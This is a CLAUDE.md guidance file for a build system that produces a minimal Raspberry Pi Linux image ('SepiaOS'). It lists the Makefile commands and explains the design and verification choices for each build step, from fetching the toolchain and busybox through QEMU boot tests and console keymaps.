# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Project Status

Everything through step 8 is committed; the board table in the `Makefile` and `.github/workflows/` are not. **Everything `README.md` specifies is implemented**: the boot partition, the cross-compiler, musl libc, busybox, the kernel modules, the bootable image, the QEMU test, the launcher, and CI plus the manual release build.

**`.gitignore` needed a fix to make this repository buildable from a clone**: the stock C section's `*.d` pattern matches the *directory* `overlay/etc/init.d`, so `rcS` and `rcK` had never been committed — a fresh clone would have built an image whose init has no sysinit script, and so no `/proc`, no `/dev`, no getty and no login prompt. `!overlay/etc/init.d/` re-includes it. Worth remembering if a file that plainly exists refuses to be added.

Layout, matching the sibling `boot` repository and already encoded in `.gitignore`: `overlay/` (the files that are copied into the root filesystem verbatim — source, not generated), `tools/` (things a person runs, plus the keymap generator the build calls), `.github/workflows/` (CI and the manual release), `downloads/` (fetched upstream artifacts, kept across `clean`), `build/` (everything generated), `dist/` (release artifacts).

## Commands

**Use `gmake`, not `make`.** The Makefile hard-errors on Make 3.81 (`/usr/bin/make` on macOS).

```sh
gmake help                              # every target, with the variables that steer them
gmake boot-partition                    # fetch + verify + unpack the boot image
gmake boot-info                         # tag, size, and where partition 1 ends
gmake boot-update                       # re-resolve "latest" and refetch
gmake CHANNEL=release boot-partition    # take the latest full release instead
gmake BOOT_TAG=v0.1.0 boot-partition    # pin one specific boot release
gmake toolchain                         # fetch the aarch64 cross-compiler for this host
gmake toolchain-info                    # which compiler, from where, targeting what
gmake musl                              # cross-build musl into build/sysroot (~2 min cold)
gmake musl-info                         # version, sysroot, static/shared sizes
gmake musl-check                        # link a test program against the sysroot, both ways
gmake MUSL_VERSION=1.2.5 musl           # pin a musl release
gmake busybox                           # build busybox and install it into build/sysroot
gmake busybox-info                      # version, size, applet count, loader
gmake modules                           # install the boot kernel's modules into build/sysroot
gmake modules-info                      # firmware tag, commit, both trees with sizes
gmake modules-check                     # re-read the installed trees and their depmod data
gmake FIRMWARE_TAG=1.20260521 modules   # pin the firmware tag instead of taking boot's
gmake e2fsprogs                         # mke2fs/debugfs for this host, resize2fs for the target
gmake rootfs                            # stage the FHS tree under build/rootfs
gmake rootfs-info                       # size, file count, kernels it carries
gmake image                             # build/image/sepiaos-<version>.img
gmake image-info                        # partition table, sha256, ext4 state
gmake image-check                       # re-read it: fsck, ownership, partition table
gmake IMAGE_SIZE_MIB=512 image          # a roomier card image
gmake test                              # everything below, ~45 s
gmake boot-check                        # boot as a Pi 3, assert it reaches a login prompt
gmake grow-check                        # boot a padded copy, assert the first-boot resize
gmake keymaps                           # generate the console keymaps
gmake smoke                             # boot it as all four emulable boards
gmake QEMU_BOARD=pi4 boot-check         # boot it as one specific board
gmake boot-log                          # the serial log of the last boot-check
gmake run                               # boot it in a QEMU window and log in
gmake RUN_ARGS=-f run                   # the same, starting from a fresh card
gmake RUN_ARGS="-F -r 640x480" run      # full screen, largest console text
tools/qemu.sh -h                        # every option the launcher takes
gmake clean                             # drop build/, keep downloads/
gmake distclean                         # also drop downloads/ (including ~600 MiB of toolchain)
```

Every aggregate goal (`boot-partition`, `toolchain`, `musl`, `busybox`, `modules`, `rootfs`, `image`) ends with a `READY` line naming the version and where it landed. That line prints whether or not anything was rebuilt — a phony goal whose prerequisite is already built otherwise prints *nothing*, which reads exactly like a broken target.

Required tools: `gmake` ≥ 4.0, `curl`, `git`, `jq`, `xz`, `tar`, `python3` (for the keymaps, the only part of the build needing an interpreter), and a C compiler for the host build of e2fsprogs; `mtools` and `qemu-system-aarch64` for the test targets (`brew install make jq xz mtools qemu`; macOS 13+ already ships `jq` at `/usr/bin/jq`). Nothing needs root, on either platform.

### How step 1 works

- `CHANNEL` (`prerelease` by default, or `release`) is the rootfs build's *own* channel, and it selects the matching boot release. Implemented literally per the README: a release build never picks up a pre-release, and a pre-release build stays on the pre-release line even once a full release exists.
- The asset is **not** addressed by a guessed filename. The release JSON is asked for its `.img.xz` asset, so an upstream rename surfaces as a clear error rather than a 404 on an invented URL. `SHA256SUMS` is mandatory — an image that cannot be verified is refused.
- `"latest"` is resolved **once** and cached in `build/boot/release.env`; a build does not drift onto a newer boot partition halfway through. `boot-update` is the only thing that moves it. `build/boot/.config` carries a signature of `BOOT_REPO|CHANNEL|BOOT_TAG` so that changing one of those on the command line — which touches no file — still invalidates the resolution.
- Downloads are keyed by tag under `downloads/boot/<tag>/` and survive `clean`, because release assets are immutable.
- **`--fail` is deliberately absent from the API calls** and present on the asset downloads. On the API it would collapse "no such release" and "the network is down" into one non-zero exit; the HTTP status is read instead so the three cases (404, rate limit, transport failure) each report themselves. On the asset downloads `--fail` is what stops a 404 page being saved as if it were the image.
- `GITHUB_TOKEN` is honoured when set — the unauthenticated API allows 60 requests an hour per IP.
- After unpacking, MBR byte 450 is asserted to be `0x0c` (FAT32 LBA). Cheap, and it catches having fetched something that is not a Pi card before a rootfs gets appended to it.

### How step 2 works

**No vendor ships an aarch64-linux-targeting toolchain for both hosts.** This was checked, not assumed, and it is why "the macOS version on macOS, the Linux version on Linux" means two different sources:

- Arm's own GNU toolchain has macOS builds only for its *bare-metal* targets (`aarch64-none-elf`). Every `*-none-linux-gnu` build is Linux- or Windows-hosted, so it cannot serve a macOS host at all.
- `messense/homebrew-macos-cross-toolchains` publishes darwin-hosted assets only — there is no Linux-hosted asset in its releases.

So: **macOS → messense 15.2.0** (`aarch64-unknown-linux-gnu`, gcc 15.2), **Linux → Arm 14.3.rel1** (`aarch64-none-linux-gnu`, gcc 14.3). Both hosts and both host architectures were verified to resolve. The consequence is that **the compiler differs by build host, so macOS and Linux builds are not byte-identical** — release builds should be cut on Linux the way `../boot` already does it, with macOS as the development host.

- The **GNU-targeting** variant is chosen deliberately over the musl-targeting one messense also ships: step 3 builds musl from source, and a toolchain with musl baked in would make that step a no-op.
- Everything is pinned, so unlike step 1 nothing is resolved over the network and all paths are known at parse time — ordinary Make file targets, no cached resolution.
- Both vendors publish a plain `sha256sum`-format sidecar (`.sha256` for messense, `.sha256asc` for Arm — despite the name it is a bare digest, not a signature), so the download is checked against upstream's own digest rather than a checksum committed here.
- The toolchain is unpacked into `downloads/toolchain/<vendor>-<version>-<host>/`, **not** `build/`: it is an immutable upstream artifact and ~600 MiB is too much to re-extract on every `clean`.
- `$(CROSS)gcc -dumpmachine` is asserted after unpacking. A toolchain for the wrong *host* extracts happily and then fails to exec; one for the wrong *target* compiles happily and produces host binaries. One cheap call catches both — it correctly rejects `CROSS_COMPILE=/usr/bin/`, for instance.
- Setting **`CROSS_COMPILE`** (e.g. Debian's `aarch64-linux-gnu-`) skips the download entirely and validates what you pointed at.

### How step 3 works

- **`build/sysroot` is the deliverable**, produced by `--prefix=/usr --syslibdir=/lib` plus `make install DESTDIR=…`, *not* by an absolute `--prefix`. That keeps the tree correct as a rootfs: `lib/ld-musl-aarch64.so.1` points at `/usr/lib/libc.so`, which is where it really will be on the target. Steps 4 and 5 consume it directly.
- **`--disable-wrapper`, so no `musl-gcc` is built.** The sysroot doubles as the source of the shipped rootfs and SepiaOS ships no compiler; without the flag musl installs `usr/bin/musl-gcc` and `usr/lib/musl-gcc.specs`. The wrapper would be the wrong tool here anyway — its specs bake in whatever absolute paths `configure` saw, so a staged install points them at the build host's directories, and `-isystem /usr/include` inside a specs file is not sysroot-relative. Step 4 builds with `--sysroot=$(abspath build/sysroot) -Wl,--dynamic-linker=/lib/ld-musl-aarch64.so.1` instead.
- **The sysroot is musl *plus* Linux UAPI headers.** A musl install alone is not a usable sysroot: busybox will not compile without `linux/kd.h` and friends. They are copied in from `$(CROSS)gcc -print-sysroot` — the same toolchain that supplies libgcc — so this costs no download and cannot drift from the compiler.
- **The version is resolved from git tags** (`git ls-remote --tags --refs`), not by scraping the release index. `sort -V` is what keeps 1.2.10 above 1.2.6; a plain `sort` gets that backwards. Resolution is cached in `build/musl/version.env` exactly like the boot release, with `musl-update` to move it.
- **Trust model is weaker here than in steps 1 and 2, and this is worth knowing.** musl publishes no checksum sidecar — only a detached GPG signature — so the digest is recorded in `checksums/musl-<version>.sha256` on first fetch and checked against that record every time after. That first fetch is trust-on-first-use; the manifest must be committed for it to mean anything afterwards. `musl-verify-sig` is the real check (pinned fingerprint `836489290BB6B70F99FFDA0556BCDB593020450F`) and is opt-in because it needs `gpg` plus a keyserver round trip.
- **Both linkages are exercised, not inferred** from `libc.a` and `libc.so` merely existing: a test program is linked static and dynamic, then `readelf` confirms AArch64 and that the dynamic one records the musl loader. `readelf` comes from the cross-toolchain, so this adds no dependency — `file` is absent from a slim Debian image.
- `configure` and `make` output goes to `build/musl/musl-<version>/{configure,build}.log`; only the tail surfaces, and only on failure.

### How step 4 works

- **Verification is stronger here than for musl**: busybox publishes a plain `.sha256` next to every tarball, so the download is checked against upstream's own digest with no trust-on-first-use record to keep.
- **defconfig compiles clean against musl** — checked on 1.38.0, no applets had to be turned off. Flags go in through `CONFIG_EXTRA_CFLAGS` / `CONFIG_EXTRA_LDFLAGS`, which is where busybox's `Makefile.flags` picks up anything extra.
- **"Dynamic, against the musl from step 3" is read back off the binary**, not inferred from the flags that were passed: `readelf` must show AArch64, an interpreter of `/lib/ld-musl-aarch64.so.1`, and a `NEEDED` entry for `libc.so`. A static build would have none of those. `CONFIG_STATIC` is separately asserted to be unset before the build starts.
- **`make busybox` always runs the compiler**, by design: `$(BB_BIN)` carries a `FORCE` prerequisite. Configuring is a separate stamp from compiling, because `defconfig` rewrites `.config` from scratch and so invalidates every object file — folding the two together made every run either a full rebuild or, once nothing upstream had changed, no build at all. busybox's own kbuild decides what to recompile (about three seconds when nothing changed) and is a better judge of that than a stamp here, which cannot see an edit inside the source tree. The result is copied out only when it differs, so an unchanged build does not bump timestamps and set everything downstream rebuilding.
- **busybox is installed into `build/sysroot`** (`make install CONFIG_PREFIX=…`): `/bin/busybox` plus 408 applet symlinks, including `/sbin/init` and `/bin/sh`. `make busybox.links` is run too — the same applet list with FHS paths, for step 5.
- Because musl and busybox now share that tree, **step 3 clears only the directories musl owns** (`usr/include`, `usr/lib`, `lib/ld-musl-*`) instead of the whole sysroot; an `rm -rf` there would delete the busybox install whenever musl alone was rebuilt.
- **`oldconfig` reads from `/dev/null`, never from `yes ""`.** Under `pipefail` a `yes` killed by SIGPIPE fails the whole recipe. Nothing is asked anyway, since editing two string options introduces no new symbols.
- **busybox.net is genuinely flaky** — it went down for minutes and reset mid-transfer connections repeatedly during development. Hence `--retry-all-errors` on every download (plain `--retry` does not cover a reset once bytes are moving), and `BUSYBOX_BASE` is overridable so a mirror such as `https://sources.buildroot.net/busybox` can serve the tarball. That mirror carries no `.sha256`, so the digest is always taken from the canonical site (`BUSYBOX_SUMS_BASE`) and a mirrored tarball still has to match it. Resolving "latest" needs the canonical index either way, so a mirror only helps together with `BUSYBOX_VERSION`.

### How step 5 works

- **The firmware tag is read out of the boot release notes, not configured.** The release body carries ``| Raspberry Pi firmware | `1.20260521` |``, and step 1's single API call now also mines that into `BOOT_FIRMWARE_TAG` in `build/boot/release.env`. Modules from a different kernel version will not load, so the tag that produced the boot kernel is the only correct one; `FIRMWARE_TAG=` overrides it and then step 5 needs no boot release at all.
- A `release.env` written before that field existed makes `modules` stop with an explicit "run `boot-update`" message rather than a confusing empty tag — `${VAR+set}` distinguishes *absent* (stale file) from *empty* (a release whose notes name no tag), and the two get different advice.
- **A blobless sparse clone is what fetches them.** Each tree is 1900 files, so HTTP would be several thousand requests, and the release tarball would drag in all five module trees plus the firmware blobs. `git clone --depth 1 --filter=blob:none --sparse --branch <tag>` costs 1.8 MiB and ~3 s; the sparse checkout of the two wanted paths then pulls the ~54 MiB that is actually used. Same technique `../boot` uses for `boot/overlays`.
- **The kernel version is discovered, not configured**: `git ls-tree HEAD modules/` is read from the clone and the entries ending `-v8+` and `-v8-16k+` are picked. It changes with every firmware release, and `modules/` is the authority on it. `1.20260521` gives `6.18.32-v8+` (1887 modules) and `6.18.32-v8-16k+` (1886), 27 MiB each.
- The other three trees are deliberately left behind: `+` and `-v7+` are 32-bit kernels this project does not ship, and `-v8-rt+` is the realtime kernel the boot partition does not carry.
- **The recorded artifact is the tag's commit SHA**, in `checksums/firmware-<tag>.commit`, trust-on-first-use like the musl digest. A git tag can be moved upstream; everything below the commit is covered by git's own integrity, so one line of manifest stands in for 3800 files. Verified by simulation: a mismatched record aborts the fetch and leaves nothing behind in `downloads/`.
- **`depmod` has already been run upstream** — `modules.dep`, `modules.alias` and the `.bin` companions ship in the tree — so nothing here has to run a `depmod` that can target a foreign module tree from macOS. The modules themselves are `.ko.xz`.
- **The assertion reads `modules.dep` and looks for the first module it names.** That is what catches the real failure mode: a sparse-checkout pattern that matches the directory but none of its contents leaves all the metadata in place and the `.ko.xz` files absent, which every "does the directory exist" check would pass.
- `build/sysroot/lib/modules` belongs to this step alone and is cleared wholesale on rebuild, so a moved firmware tag cannot leave the previous kernel's tree behind. It is deliberately **independent of musl and busybox** although all three write into the same sysroot — `make modules` is usable on its own, without waiting for a libc build.
- Downloads are keyed by tag under `downloads/modules/<tag>/` and survive `clean`; a `.complete` marker distinguishes a finished copy from an interrupted one, which would otherwise look like a good cache entry. `clean` + `modules` is ~3 s.
- **For step 6:** busybox's `FEATURE_SEAMLESS_XZ` defaults to `y` and its help text names modprobe explicitly (`modprobe` reads modules through `xmalloc_open_zipped_read_close`), so a defconfig busybox can load these `.ko.xz` files. Worth re-reading off the generated `.config` when module loading is actually wired up.

### How step 6 works

Three parts: e2fsprogs, the staged tree, and the image.

**e2fsprogs, built twice.** macOS has no `mkfs.ext4`, no loop mounts and no root; Linux has e2fsprogs but at whatever version the distribution froze on, and the version decides the on-disk layout. One pinned source tree configured twice settles both: host `mke2fs`/`debugfs`/`e2fsck`, and a target `resize2fs` — the one thing first boot needs that busybox has no applet for. Verified against kernel.org's `sha256sums.asc`, whose digest lines are already in `sha256sum --check` format. `HOST_E2FSPROGS=<dir>` skips the host build. Only `make libs` plus `make -C resize` is built for the target: several of the test programs in the tree do not cross-link, and none of them are wanted.

- **A cross build that finds the host's `ar` fails in a way that reads as a source problem.** configure looks for `aarch64-linux-ar`, does not find it, and silently uses `ar`. On macOS that writes archives with a `__.SYMDEF` index, which GNU ld cannot read — so every library "builds" and then every symbol in it is undefined at link time, including symbols `ar t` will happily list. `AR`, `RANLIB` and `STRIP` are passed explicitly.

**The staged tree** (`build/rootfs`) is busybox and its 408 applet links, the musl loader and `libc.so`, both module trees, `resize2fs`, and `overlay/`. `overlay/` holds real files rather than heredocs in the Makefile — `rcS`, `sepia-gettys` and `sepia-firstboot` are shell programs worth reading, diffing and running `sh -n` over. Only what varies per build is generated: `/etc/shadow`, `/etc/fstab`, `/etc/os-release`, `/etc/issue`. The tree is ~57 MiB, of which 54 MiB is kernel modules.

- **`/sbin/init` is a wrapper script, not busybox.** The kernel opens `/dev/console` for PID 1 in `console_on_rootfs()`, which runs *before* `prepare_namespace()` mounts the real root — with no initramfs there is nothing to open (`Warning: unable to open an initial console` in the log) and init is exec'd with fds 0, 1 and 2 closed. busybox init does not open a console of its own on Linux: it honours `CONSOLE`/`console` in the environment and otherwise calls `bb_sanitize_stdio()`, pointing everything at `/dev/null`. The result is a system that boots perfectly and says nothing whatsoever. The wrapper opens `/dev/console` (devtmpfs is mounted by then) and execs busybox init.
- **The probe before that `exec` is load-bearing.** `/dev/console` can exist and still fail to open — see the QEMU caveats below — and a failed redirection on `exec` kills the shell, which as PID 1 is a kernel panic. It is tested in a subshell first.
- **busybox's install puts a symlink at `sbin/init`, so it is removed before the overlay is copied.** `cp` onto a symlink follows it: copying the overlay over the top would overwrite `/bin/busybox` with a five-line shell script and produce an image with no userspace at all.
- **The kernel mounts / read-only** unless the command line says `rw`, and the one `../boot` ships says neither `ro` nor `rw`. `rcS` remounts it read-write before anything that writes — which is everything after it.
- **busybox 1.38.0 `login` has no password ageing at all** (no `sp_expire`/`sp_lstchg` handling; checked in the source), so "must change the password on first login" cannot lean on `/etc/shadow`. A marker file, `/etc/sepiaos-password-unchanged`, carries it instead, and `/etc/profile` refuses to hand over a shell until `passwd` has actually succeeded. The retry loop is **bounded**: `passwd` fails instantly when stdin is at EOF, so an unbounded loop would spin at full speed for a login shell started from a script. After three failures the login shell exits, which drops back to the getty.
- **`/etc/securetty` is deliberately absent.** busybox's `is_tty_secure()` reports "secure" when the file is missing or empty, so absence allows root everywhere; a partial list would lock root out of any console not on it, which on six boards plus QEMU is a trap.
- The shipped root password hash is a fixed sha512-crypt of `sepiaos`, embedded rather than generated: `/usr/bin/openssl` on macOS is LibreSSL and has no `-6`. It was verified inside a booted image against busybox's own crypt (`mkpasswd -m sha512 -S SepiaOSsalt sepiaos`), which is the implementation that has to accept it.

**The image** is the boot release's own 64 MiB partition 1 copied in whole, an ext4 filesystem behind it, and one MBR entry written by hand. Nothing is mounted and nothing needs privileges.

- **`mke2fs -d` copies the ownership it finds on disk**, so a staged tree owned by uid 501 becomes an image whose `/etc` and `/bin` belong to uid 501. `-E root_owner=0:0` fixes only the root inode. Every inode is set to `0:0` afterwards by one `debugfs` run over a generated file of `sif` commands — about 7500 of them, quick because debugfs opens the filesystem once. Doing it this way also makes the image independent of who built it, which a `sudo chown -R` of the staging tree would not be.
- `e2fsck -fn` afterwards is what says the result is a filesystem rather than bytes; the ownership pass is checked by reading three inodes back out of the finished image, because a `sif` that silently missed would not fail the build.
- Partition 1's start and length are **read out of the boot image** rather than assumed. They are the boot release's decision, and a hardcoded 64 MiB would write the rootfs over the FAT if it ever changed.
- `IMAGE_SIZE_MIB` must be a power of two (QEMU), and the default 256 MiB is sized to its contents — 192 MiB of rootfs against 57 MiB of tree. Growing it is first boot's job.

**First boot** (`/usr/sbin/sepia-firstboot`) is two passes with a reboot between them, and that is a constraint rather than a choice: **the kernel will not re-read a partition table while one of that disk's partitions is mounted, and / always is.** Pass 1 rewrites the table and reboots; pass 2 sees the larger partition, grows the filesystem onto it with an online `resize2fs`, and brings up swap. Raspberry Pi OS splits its own resize the same way for the same reason.

- The table is written as raw MBR bytes rather than through `fdisk`: the wanted layout is exact and already known (partition 1 and the start of partition 2 never move), and 16 bytes per entry is less machinery than driving an interactive tool from a script. The whole 512-byte sector is read, patched and written back in one write, so a power cut cannot leave half a table.
- The disk is found through sysfs (`/sys/class/block/<part>/..`), which names it without guessing whether the partition suffix is `p2` or `2` — that differs between `mmcblk` and `sd` devices, and partition 3 has to be built the same way round.
- Swap sizes are the README's (1/2/4 GiB by device size, thresholds in GB as storage is sold). **On a small card the rule asks for a swap partition bigger than the space there is**; growing the filesystem is the more useful half, so when swap will not fit the whole device goes to the rootfs and the boot log says so.
- Verified end to end under QEMU on a 4 GiB card: root 192 MiB → 3008 MiB, swap 1024 MiB at partition 3, `fstab` updated, `firstboot-done` marker written, and a second boot that does nothing but `swapon -a`.

### How step 7 works

`make test` is `image-check` (the image read back on the host), then `boot-check`, then `grow-check`. About 45 seconds in total, which makes it usable as the gate after any change.

- **The kernel and device tree are pulled out of the image's own FAT partition** with mtools, at the offset its own MBR gives. QEMU emulates the ARM side of a Pi and not the VideoCore boot ROM, so it never reads `bootcode.bin`, `start.elf` or `config.txt` off the card and the kernel has to be handed to it as `-kernel`; taking it from anywhere else would let the test pass against a kernel the image does not carry.
- **`boot-check` checks each step of the boot separately** rather than only looking for the login prompt: kernel up as a Pi 3, both partitions enumerated, root mounted, init started, `/` remounted read-write, first boot ran, a getty started, prompt appeared. When something breaks, *which of those is the last to pass* is the entire diagnosis. Booting with `QEMU_CONSOLE=ttyAMA0` demonstrates it — everything through the remount passes and the three userspace lines fail, which is exactly the signature of a userspace with no console.
- **`grow-check` runs without `snapshot=on`**, because the thing under test is the reboot between the two passes of `sepia-firstboot`; it works on a copy padded to `GROW_SIZE_MIB`. It then checks the log *and* the partition table it left behind, since a resize that reports success and writes a table nothing can boot is the failure worth catching. 4 GiB is the smallest sensible card: below 64 GB the README asks for 1 GiB of swap, so anything smaller is all swap and no growth.
- QEMU is killed as soon as the log says what was being waited for, rather than always burning `QEMU_TIMEOUT`. It has to be killed either way — with no VideoCore and no shutdown request it sits at the login prompt indefinitely.
- **`QEMU_BOARD` selects the board**, and `make smoke` runs every one QEMU can emulate: `pi-zero2w`, `pi3`, `pi4`, `cm4`. Pi 5 and CM5 have no QEMU machine at all, so BCM2712 is hardware-only — the same split `../boot` makes. The Zero 2 W is emulated as `raspi3b` rather than `raspi3ap`, whose device tree takes a synchronous external abort in `bcm2835_power_probe`.
- **All four register the PL011 as `ttyAMA1`** — checked on each, not assumed from the Pi 3 — so one `QEMU_CONSOLE` covers them. What does differ is per-SoC: the PL011 sits at `0xfe201000` on BCM2711 against `0x3f201000` on BCM2837, and under QEMU the Pi 4 and CM4 expose the card as `mmcblk1` where BCM2837 and real hardware use `mmcblk0`. That last one is why the `root=` passed to QEMU and the `root=` in the image's own `cmdline.txt` legitimately differ.
- The per-board expected `Machine model` string is asserted too, so a test cannot quietly pass having booted the wrong device tree.

### How step 8 works

`tools/qemu.sh` is the launcher; `make run` builds the image and hands over to it. It is a script rather than a recipe because it is what a person runs to *use* the OS: it takes options, it can be read, and it works on a checkout where make has built nothing.

- **The window is where you log in, and that is forced, not chosen.** The serial line under QEMU is output-only (see the QEMU caveats), so the framebuffer console and a USB keyboard are the only way to type anything. Hence `console=tty1` last on the command line — making it `/dev/console`, and so where the getty lands — and `-device usb-kbd`. `dwc2`, `hid` and `usbhid` are all builtin in the Pi kernel (`modules.builtin`), so the keyboard needs no module loading, which matters because nothing in this rootfs autoloads modules.
- **First boot is run headlessly before the window opens**, once per working copy, and this is worth keeping. QEMU's raspi3b does not come back from a warm reset cleanly: the framebuffer returns with its red and blue channels swapped — verified by screendump — and a `-serial mon:stdio` chardev stops producing output altogether, though `-serial file:` survives. An interactive session that starts before the first-boot reboot is therefore unreadable in the window and silent in the terminal. A cold boot of an already-grown card has neither problem.
- **No `earlycon=` here**, unlike the test targets. earlycon prints the messages from before the real console registers and the kernel then replays that same buffer to the console when it does, so every early line arrives twice on the terminal. Worth it when diagnosing a kernel that will not boot; not when using one that does.
- **`reboot` in the guest restarts QEMU rather than resetting the machine**, and that is forced too. QEMU's raspi3b does not come back from a warm reset while a USB device is attached to its dwc2 controller. Tested all four combinations: with no `-device usb-kbd` it resets and boots again whether or not the framebuffer console is in use; with the keyboard attached it never comes back, and the guest reaches `reboot: Restarting system` identically either way. A USB keyboard is the only way to type on this machine, so `-no-reboot` turns the guest's reset request into a clean exit and the launcher's loop starts it again — a cold boot, which also avoids the swapped red/blue channels and the silent serial a warm reset leaves behind. Telling a reboot from a quit needs the kernel, since both exit 0: the console is logged with `-chardev ...,logfile=` and `Restarting system` (emerg level, so it survives rcS's `dmesg -n 3`) is the marker. Verified both ways — reboot relaunches, `quit` exits and stays exited.
- The help text is an unquoted heredoc, so **backticks in it are executed**. A line added there with `` `reboot` `` in it ran the reboot applet every time anyone typed `qemu.sh -h`; harmless on macOS as a normal user, a reboot on Linux as root. Use single quotes in that block.
- **Scaling the window is the only way to make the console text bigger.** The Raspberry Pi kernel has exactly two console fonts compiled in — `VGA8x16` and `VGA8x8` — so `fbcon=font:SUN12x22` and friends are silently ignored and 8x16 pixels is the ceiling. (Checked by decompressing the kernel: `kernel8.img` is a gzip stream, which is also why `strings` finds nothing in it, and why the boot image carries no readable kernel version.) So the launcher passes `-display cocoa,zoom-to-fit=on` (or `gtk`, whichever this QEMU has), which is what makes the window resizable and scales the guest image with it; without it the window is fixed at the guest's resolution. `-F` starts full screen.
- **The framebuffer size comes from the kernel command line**, `bcm2708_fb.fbwidth=`/`fbheight=`, because QEMU never runs the firmware and so `config.txt` cannot set it the way it would on a real board. `-r` drives those; the default 1024x768 is a 128x48 console. Since the font cannot grow, a *smaller* `-r` is what reads better once the window is enlarged: `-F -r 640x480` is an 80x30 console scaled to the whole display, and about as large as the characters get.
- The launcher never writes to the image. It copies it once to `build/qemu/run.img`, pads that copy out to `-s` (4 GiB by default, sparse, so it costs what is written), and reuses it — a changed password or an added file is still there next time. `-f` starts over, `-t` discards just this run's writes.
- **An intermittent kernel panic on the warm reboot was seen once** and did not reproduce in four further runs — an Oops in an interrupt on a secondary CPU during `secondary_start_kernel`, straight after QEMU's machine reset. It looks like an emulator artifact rather than anything in the image; it is worth knowing about if `grow-check` ever fails once and then passes.
- Verified by driving the emulated keyboard through the QEMU monitor (`sendkey`) and reading the framebuffer back with `screendump`: login as `root`, the default password accepted, the forced password change enforced and completed, and a shell prompt that runs commands. That is also how the step 6 login requirements were confirmed — there is no other way to see the framebuffer console from a terminal.

### Console keymaps

`tools/generate_keymaps.py` is run by `make keymaps`, which `make rootfs` depends on; the result lands in `/usr/share/keymaps` and `overlay/usr/bin/sepia-keymap` is what chooses between them. `README.md` documents the commands; what is worth knowing here is why the generator looks the way it does.

- **The format is busybox's, and it is not obvious.** `console-tools/loadkmap.c` reads seven bytes of `bkeymap` magic, then 256 flag bytes (one per keymap table, `1` meaning "this table follows"), then 128 `uint16` entries per flagged table in host byte order. `NR_KEYS` is 128, not 256. An entry is `(type << 8) | value`, so only characters below U+0100 fit — the euro sign is the one character these layouts ask for that does not, and the generator leaves it unmapped and says so rather than writing `0x20ac`, whose high byte would be read as keymap type 32.
- **A flagged table is loaded in full.** `loadkmap` calls `KDSKBENT` for all 128 of its entries, so a table is not a patch: every key it does not set is overwritten with whatever the file contains. A layout built from nothing therefore sets Ctrl, both Shifts, Alt, CapsLock and the cursor keys to NUL — a keyboard that types but cannot be typed on.
- **So the generator starts from the kernel's own keymap.** It carries the output of `dumpkmap`, captured from a booted SepiaOS and base64'd into the script, and overlays only the plain, shift and AltGr tables with what a layout changes. The regeneration recipe is in the file. Two consequences worth keeping: letters use `KT_LETTER` (`0x0b00 | c`) rather than `KT_LATIN` so CapsLock still applies to them, and Esc, Backspace, Tab, Enter and Space keep the kernel's keysyms — Enter is `K_ENTER` (`0x0201`), not a bare carriage return. That last part is why **`english_us.kmap` comes out byte-identical to the keymap the kernel boots with**, which is the cheapest possible check that the whole encoding is right.
- **`de_mac_nodeadkeys` is the one layout that reaches past AltGr**, and it has to: Apple's German layout puts the backslash on Shift-Option-7, and the kernel ships no shift+AltGr table at all — `key_maps[3]` is NULL, which is why that combination does nothing on a stock console. So `compile_binary_kmap` overlays tables 0–3 rather than 0–2, creating table 3 when a layout asks for one: holes everywhere except its own entries. Nothing is taken away by that, because an absent table is one the kernel never looks anything up in. It is also why that one file is 3079 bytes where every other is 2823 — one more flagged table, 256 bytes. Everything the layout does not list keeps the kernel's own AltGr entries, so the US leftovers (`{`, `[`, `]`, `}` on AltGr-8/9/0) stay reachable alongside the Option-5/6/8/9 the keyboard is printed with.
- **`rcS` ends with `dmesg -n 3`**, and the level is not arbitrary. Under QEMU two messages arrive at ~12 s and ~22 s, after the login prompt is already up, and scribble over it: `mmc1: Timeout waiting for hardware interrupt` (the SDIO controller giving up on the Pi 3's on-board BCM43438, which `/soc/mmcnr@7e300000/wifi@1` in the device tree describes and the emulator does not provide) and `leds-gpio: Failed to get GPIO '/leds/led-act'` (the ACT LED's GPIO comes from the VideoCore firmware, so `brcmvirt-gpio` fails to map it, `raspberrypi-exp-gpio` never appears, and the driver core reports the still-pending probe when its 10 s timeout expires). Both are `KERN_ERR`, so `quiet` — which sets the level to 4 — does not hide them; 3 is the first level that does, at the cost of also keeping err and warn off the console. Everything stays in the ring buffer, and emerg/alert/crit still print, so a panic is still seen. Measured rather than assumed: over 110 s of uptime the mmc1 message appears once or twice and then stops, so this is console noise and not a loop.
- It goes *after* the getty is started, so the entire boot is still printed as it happens — and, not incidentally, so that the strings `boot-check` and `grow-check` grep for (`re-mounted … r/w`, `resized filesystem to`, `Adding … swap on`) are all emitted before the level drops.
- **Keymaps are a VT thing.** They apply to keys arriving from a real keyboard; a serial console has no keymap, so `sepia-keymap` reports that it cannot find a console rather than appearing to work. This is also why the feature can only be tested through the framebuffer: `sendkey` into the emulated USB keyboard, `screendump` to read the result.
- Verified that way end to end: `sepia-keymap set de`, then the keys QEMU calls `y` and `z` produce `zy` (QWERTZ), `shift-a` produces `A` (the modifiers survived), and `bracket_left` produces `ü` (a layout key the US map does not have).
- `de_mac_nodeadkeys` was verified the same way, booted with `init=/bin/sh` so that neither the login nor the first-boot resize was in the way of the one thing under test. After `loadkmap </usr/share/keymaps/de_mac_nodeadkeys.kmap`, `alt_r-l` gives `@`, `alt_r-n` gives `~`, `alt_r-5/6/8/9` give `[`, `]`, `{`, `}`, `alt_r-7` gives `|` and **`shift-alt_r-7` gives `\`** — that last one being the point, since it says the kernel does allocate `key_maps[3]` when `loadkmap` writes to it and the VT does look the table up. `alt_r-q`/`shift-alt_r-q` gave `«`/`»` and `alt_r-a`/`shift-alt_r-a` gave `å`/`Å`, so shift+AltGr is a table and not one lucky key.

### Resolving "latest" without a single point of failure

A CI run failed with `fatal: unable to access 'https://git.musl-libc.org/git/musl/': Failed to connect ... after 135878 ms`. Worth reading carefully, because the shape of it recurs: the build was resolving which musl version is current, the tarball it would have asked for **was already in the restored `downloads/` cache**, and one small upstream host being unreachable for two minutes took the whole build down anyway.

- **Version resolution is the part that always needs the network**, even when every byte the build consumes is already on disk. `build/*/version.env` lives under `build/`, which is deliberately not cached, so every run re-asks.
- musl now asks `git.musl-libc.org`, then `repo.or.cz/musl.git`, then `github.com/kraj/musl.git`, then falls back to the newest tarball already in `downloads/musl`. Both mirrors were checked to report the same latest tag as the primary. They only ever supply a *number*: the tarball still comes from `MUSL_BASE` and still has to match `checksums/`, so no mirror is trusted with bytes that reach the image.
- busybox got the same treatment minus the mirrors — `busybox.net` is the flakiest host this build touches, and there is no index elsewhere to read — so it falls back to `downloads/busybox` and says so.
